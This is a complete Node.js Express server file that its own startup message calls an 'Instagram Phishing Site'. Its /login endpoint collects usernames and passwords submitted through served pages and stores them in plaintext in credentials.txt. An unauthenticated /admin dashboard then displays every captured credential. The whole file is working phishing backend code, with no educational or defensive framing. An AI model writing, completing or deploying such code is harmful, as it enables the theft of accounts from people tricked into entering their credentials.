// filename: server.js
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

// Path to store captured credentials
const credentialsFilePath = path.join(__dirname, 'credentials.txt');

// POST endpoint to receive login attempts
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ message: 'Username and password are required.' });
    }

    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] Username: ${username}, Password: ${password}\n`;

    // Append credentials to the file
    fs.appendFile(credentialsFilePath, logEntry, (err) => {
        if (err) {
            console.error('Failed to write credentials to file:', err);
            return res.status(500).json({ message: 'Internal server error.' });
        }
        console.log(`Credentials captured: ${username}`);
        res.sendStatus(200); // Send a success status back to the client
    });
});

// GET endpoint for the admin dashboard
app.get('/admin', (req, res) => {
    fs.readFile(credentialsFilePath, 'utf8', (err, data) => {
        if (err) {
            if (err.code === 'ENOENT') {
                // File does not exist, create it and return empty
                fs.writeFile(credentialsFilePath, '', { flag: 'wx' }, (writeErr) => {
                    if (writeErr) {
                        console.error('Failed to create credentials file:', writeErr);
                        return res.status(500).send('<h1>Admin Dashboard</h1><p>Error creating credentials file.</p>');
                    }
                    return res.send(`
                        <!DOCTYPE html>
                        <html lang="en">
                        <head>
                            <meta charset="UTF-8">
                            <meta name="viewport" content="width=device-width, initial-scale=1.0">
                            <title>Admin Dashboard</title>
                            <style>
                                body { font-family: 'Roboto', sans-serif; background-color: #f4f4f4; color: #333; margin: 20px; }
                                h1 { color: #0095f6; }
                                .credentials-list {
                                    background-color: #fff;
                                    border: 1px solid #ddd;
                                    padding: 15px;
                                    border-radius: 5px;
                                    margin-top: 20px;
                                }
                                .credential-item {
                                    padding: 10px 0;
                                    border-bottom: 1px solid #eee;
                                }
                                .credential-item:last-child {
                                    border-bottom: none;
                                }
                                pre { white-space: pre-wrap; word-break: break-all; margin: 0; }
                            </style>
                        </head>
                        <body>
                            <h1>Admin Dashboard - Captured Credentials</h1>
                            <div class="credentials-list">
                                <p>No credentials captured yet.</p>
                            </div>
                        </body>
                        </html>
                    `);
                });
            } else {
                console.error('Failed to read credentials file:', err);
                return res.status(500).send('<h1>Admin Dashboard</h1><p>Error reading credentials file.</p>');
            }
        } else {
            const credentials = data.split('\n').filter(line => line.trim() !== '');
            const credentialsHtml = credentials.length > 0
                ? credentials.map(entry => `<div class="credential-item"><pre>${entry}</pre></div>`).join('')
                : '<p>No credentials captured yet.</p>';

            res.send(`
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>Admin Dashboard</title>
                    <style>
                        body { font-family: 'Roboto', sans-serif; background-color: #f4f4f4; color: #333; margin: 20px; }
                        h1 { color: #0095f6; }
                        .credentials-list {
                            background-color: #fff;
                            border: 1px solid #ddd;
                            padding: 15px;
                            border-radius: 5px;
                            margin-top: 20px;
                        }
                        .credential-item {
                            padding: 10px 0;
                            border-bottom: 1px solid #eee;
                        }
                        .credential-item:last-child {
                            border-bottom: none;
                        }
                        pre { white-space: pre-wrap; word-break: break-all; margin: 0; }
                    </style>
                </head>
                <body>
                    <h1>Admin Dashboard - Captured Credentials</h1>
                    <div class="credentials-list">
                        ${credentialsHtml}
                    </div>
                </body>
                </html>
            `);
        }
    });
});

// Start the server
app.listen(port, () => {
    console.log(`Instagram Phishing Site is running on http://localhost:${port}`);
    console.log(`Admin Dashboard is available at http://localhost:${port}/admin`);
    // Ensure credentials.txt exists
    if (!fs.existsSync(credentialsFilePath)) {
        fs.writeFileSync(credentialsFilePath, '');
    }
});